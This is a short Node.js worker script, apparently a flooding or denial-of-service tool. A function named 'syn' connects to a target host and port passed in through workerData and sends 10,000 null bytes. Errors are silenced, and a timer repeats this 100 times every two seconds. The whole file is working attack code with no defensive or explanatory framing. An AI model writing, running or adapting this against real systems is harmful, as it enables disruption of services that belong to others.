const net = require('net')
const { workerData } = require('worker_threads')

function syn({ host, port }) {
  const socket = new net.Socket()
  socket.setTimeout(1000)
  socket.on('error', () => { })
  socket.connect({
    host,
    port
  })
  socket.write(Buffer.from('\0'.repeat(10000)))
  socket.end()
}

setInterval(() => {
  for (let i = 0; i < 100; i++) {
    syn(workerData)
  }
}, 2000)
